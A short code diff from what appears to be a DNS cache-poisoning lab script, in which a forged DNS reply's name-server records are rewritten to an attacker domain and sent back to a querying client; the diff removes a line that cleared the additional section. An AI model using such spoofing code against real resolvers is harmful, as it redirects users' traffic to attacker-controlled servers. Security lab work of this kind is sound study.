@@ -68,9 +68,6 @@ if __name__ == "__main__":
             # Change its name servers to ns.dnslabattacker.net
             responseBind.ns[0].rdata = 'ns.dnslabattacker.net'
             responseBind.ns[1].rdata = 'ns.dnslabattacker.net'
-            
-            # Remove the additional section
-            responseBind.arcount = 0
               
         # Reply to dig
         serverSide.sendto(bytes(responseBind), digAddress)
